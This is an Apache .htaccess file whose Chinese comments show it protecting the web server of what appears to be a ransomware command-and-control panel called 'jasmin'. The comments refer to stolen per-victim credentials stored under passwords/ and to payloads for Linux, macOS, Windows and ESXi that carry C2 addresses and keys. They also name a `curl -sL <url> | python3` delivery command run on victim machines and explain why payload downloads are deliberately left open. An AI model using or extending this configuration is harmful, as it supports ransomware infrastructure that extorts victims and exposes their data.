# ── 目录与重写 ──
Options -Indexes
RewriteEngine On

# ── 隐藏文件（.env / .installed / .schema_v3 / .key_secret / .pw_changed ...）──
# 此前只拦 .env，导致 .installed、.schema_v3 等可被公开读取
<FilesMatch "^\..+$">
    Require all denied
</FilesMatch>

# ── 归档 / 备份 / 配置 / 文档 —— 不应从 web 根下载 ──
# 注意：payloads/ 下需要公开的是 jasmin_unlock.sh|.ps1|.py、jasmin_decrypt*、
#       jasmin_private.pem.enc（均不在下列扩展名内），因此不受影响。
<FilesMatch "\.(zip|tar|gz|tgz|bz2|xz|rar|7z|bak|old|orig|save|swp|swo|log|sql|tpl|md|txt|env|ini|conf|cfg|inc|yml|yaml|lock|json|gitignore)$">
    Require all denied
</FilesMatch>

# ── 明文私钥与口令（只允许 .pem.enc 公开）──
<FilesMatch "^jasmin_private\.pem$|^\.key_secret$">
    Require all denied
</FilesMatch>

# ── 敏感目录 ──
<IfModule mod_rewrite.c>
    RewriteRule ^includes/ - [F,L]
    RewriteRule ^database/ - [F,L]
    RewriteRule ^templates/ - [F,L]
    # passwords/ 此前漏了 —— 而它恰恰是最不该公开的目录。
    # 它存的是每台受害主机的凭据，.flora 又不在下面的扩展名黑名单里，
    # 于是 `GET /passwords/<主机>_<用户>/<时间>_<id>.flora` 免登录就能拿到。
    # 实测：:8080 上未带任何 Cookie 返回 HTTP 200 + 24 字节口令明文。
    # 正规入口是需登录的 download_file.php（它直接读文件系统，不受本规则影响）。
    RewriteRule ^passwords/ - [F,L]

    # 生成的载荷必须可匿名下载 —— 投放方式是 `curl -sL <url> | python3`，
    # 受害机器上没有会话可登录。载荷本身是明文脚本，拿到它就等于拿到里面的
    # C2 地址与握手密钥，拦截下载并不增加安全性，只会让载荷无法投放。
    # （曾经在此拦过 ^payloads/jasmin_(linux|macos|win|esxi)_，已回退；
    #   文件名随机段已由 32 bit 提到 128 bit 以抵抗枚举。）
    # 密钥备份（keygen 重建时归档）仍然不可下载
    RewriteRule ^payloads/.*\.bak\. - [F,L]
    # 真正的密钥 material 直接拒绝（私钥、AES 口令）—— 无需匿名分发：
    # 解密侧使用的是 jasmin_private.pem.enc 与 jasmin_unlock.*
    RewriteRule ^payloads/(jasmin_private\.pem|\.key_secret)$ - [F,L]
</IfModule>
